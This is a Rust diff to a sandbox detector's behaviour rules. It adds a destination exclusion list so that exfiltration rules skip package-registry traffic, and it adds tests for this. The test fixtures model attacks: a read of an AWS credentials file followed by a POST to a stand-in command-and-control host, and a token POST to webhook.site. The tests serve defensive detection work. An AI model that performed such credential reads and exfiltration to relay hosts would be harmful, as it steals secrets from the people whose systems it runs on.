@@ -29,22 +29,34 @@ fn default_enabled() -> bool {
 }
 
 /// One condition: a behavior of `class` whose `detail` contains at least
-/// one of `detail_any` (or any detail, when `detail_any` is empty).
+/// one of `detail_any` (or any detail, when `detail_any` is empty) and none
+/// of `detail_none`. `detail_none` is the exclusion lever: a network_connect
+/// condition can require the destination NOT be benign package/registry infra
+/// (pypi, github, …) so an exfil rule does not fire on a routine `pip install`.
 #[derive(Debug, Clone, Deserialize)]
 struct Condition {
     class: BehaviorClass,
     #[serde(default)]
     detail_any: Vec<String>,
+    #[serde(default)]
+    detail_none: Vec<String>,
 }
 
 impl Condition {
     fn matched_by(&self, behavior: &super::observation::ObservedBehavior) -> bool {
-        behavior.class == self.class
-            && (self.detail_any.is_empty()
-                || self
-                    .detail_any
-                    .iter()
-                    .any(|needle| behavior.detail.contains(needle.as_str())))
+        if behavior.class != self.class {
+            return false;
+        }
+        let any_ok = self.detail_any.is_empty()
+            || self
+                .detail_any
+                .iter()
+                .any(|needle| behavior.detail.contains(needle.as_str()));
+        let none_ok = self
+            .detail_none
+            .iter()
+            .all(|needle| !behavior.detail.contains(needle.as_str()));
+        any_ok && none_ok
     }
 }
 
@@ -182,6 +194,81 @@ mod tests {
             .evaluate(&o, Path::new("x"))
             .iter()
             .all(|f| f.rule_id != "SANDBOX_BEHAVIOR_EXFIL_SECRET_TO_NETWORK"));
+    }
+
+    /// # Contract (negative)
+    /// Reading a sensitive file and then fetching from benign package
+    /// infrastructure (e.g. a skill reading its own `.env` then running
+    /// `pip install`, which hits PyPI) is NOT exfiltration: the outbound
+    /// connection's destination is on the `detail_none` infra list, so no
+    /// `network_connect` behavior satisfies the rule and it does not fire.
+    #[test]
+    fn exfil_chain_does_not_fire_when_only_destination_is_package_infra() {
+        let set = BehaviorRuleSet::embedded();
+        let o = obs(vec![
+            (BehaviorClass::SensitiveFileRead, "/tmp/work/.env"),
+            (
+                BehaviorClass::NetworkConnect,
+                "GET https://pypi.org/simple/requests/",
+            ),
+            (
+                BehaviorClass::NetworkConnect,
+                "GET https://files.pythonhosted.org/packages/x.whl",
+            ),
+        ]);
+        assert!(set
+            .evaluate(&o, Path::new("x"))
+            .iter()
+            .all(|f| f.rule_id != "SANDBOX_BEHAVIOR_EXFIL_SECRET_TO_NETWORK"));
+    }
+
+    /// # Contract (positive)
+    /// A secret read plus egress to a NON-infrastructure host still fires,
+    /// even when benign package traffic is also present in the same run: the
+    /// real C2 connection satisfies the non-infra `network_connect` condition.
+    #[test]
+    fn exfil_chain_fires_on_non_infra_dest_alongside_package_traffic() {
+        let set = BehaviorRuleSet::embedded();
+        let o = obs(vec![
+            (BehaviorClass::SensitiveFileRead, "/root/.aws/credentials"),
+            (
+                BehaviorClass::NetworkConnect,
+                "GET https://pypi.org/simple/requests/",
+            ),
+            (
+                BehaviorClass::NetworkConnect,
+                "POST https://c2.attacker.invalid/collect",
+            ),
+        ]);
+        assert!(set
+            .evaluate(&o, Path::new("x"))
+            .iter()
+            .any(|f| f.rule_id == "SANDBOX_BEHAVIOR_EXFIL_SECRET_TO_NETWORK"));
+    }
+
+    /// # Contract (positive + negative)
+    /// Egress to a known anonymous exfil/OOB relay (webhook.site, telegram
+    /// bot API, …) trips the abuse-channel rule; egress to package
+    /// infrastructure does not.
+    #[test]
+    fn abuse_channel_rule_fires_on_relay_not_on_infra() {
+        let set = BehaviorRuleSet::embedded();
+        let hit = obs(vec![(
+            BehaviorClass::NetworkConnect,
+            "POST https://webhook.site/df8d2f1a-5b52/collect body=token=AKIA",
+        )]);
+        let miss = obs(vec![(
+            BehaviorClass::NetworkConnect,
+            "GET https://pypi.org/simple/requests/",
+        )]);
+        assert!(set
+            .evaluate(&hit, Path::new("x"))
+            .iter()
+            .any(|f| f.rule_id == "SANDBOX_BEHAVIOR_EXFIL_TO_ABUSE_CHANNEL"));
+        assert!(set
+            .evaluate(&miss, Path::new("x"))
+            .iter()
+            .all(|f| f.rule_id != "SANDBOX_BEHAVIOR_EXFIL_TO_ABUSE_CHANNEL"));
     }
 
     /// # Contract (positive + negative)
